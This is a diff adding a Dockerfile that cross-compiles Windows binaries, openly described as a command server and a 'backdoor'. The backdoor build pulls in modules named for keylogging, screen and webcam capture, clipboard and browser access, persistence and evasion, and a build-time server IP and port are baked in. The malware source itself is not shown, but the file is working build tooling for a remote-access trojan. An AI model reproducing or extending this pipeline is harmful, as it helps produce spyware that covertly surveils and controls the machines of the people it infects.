@@ -1,0 +1,52 @@
+# syntax=docker/dockerfile:1
+
+# Linux-based cross-compile image to build Windows .exe binaries from macOS/Linux hosts.
+FROM debian:stable-slim
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# ---------------------------
+# 1) Tooling: MinGW-w64 + build essentials
+# ---------------------------
+RUN apt-get update \ 
+ && apt-get install -y --no-install-recommends \ 
+    build-essential \ 
+    mingw-w64 \ 
+    cmake \ 
+    pkg-config \ 
+    zip \ 
+ && rm -rf /var/lib/apt/lists/*
+
+# ---------------------------
+# 2) Copy project
+# ---------------------------
+WORKDIR /src
+COPY . .
+
+# ---------------------------
+# 3) Configure IP/Port at build time (matches configure.sh behavior)
+# ---------------------------
+ARG SERVER_IP=192.168.1.21
+ARG SERVER_PORT=6709
+RUN chmod +x configure.sh && ./configure.sh ${SERVER_IP} ${SERVER_PORT}
+
+# ---------------------------
+# 4) Build server & backdoor for Windows (x86_64)
+#    We use MinGW-w64 directly instead of CMake to keep the image small.
+# ---------------------------
+RUN mkdir -p /out \
+ && x86_64-w64-mingw32-gcc -I include \
+    src/server.c src/status.c src/str_cut.c \
+    -o /out/server.exe -lws2_32 \
+ && x86_64-w64-mingw32-gcc -I include -DDISABLE_EVASION \
+    src/backdoor.c src/logger.c src/screen.c src/status.c src/str_cut.c \
+    src/uuid.c src/wol.c src/process.c src/clipboard.c src/browser.c \
+    src/webcam.c src/crypto.c src/persistence.c \
+    -o /out/backdoor.exe \
+    -lws2_32 -lgdi32 -lbcrypt -lcrypt32 -lstrmiids -lole32 -lshell32
+
+# ---------------------------
+# 5) Export artifacts
+# ---------------------------
+WORKDIR /out
+CMD ["/bin/sh", "-c", "ls -lh /out"]
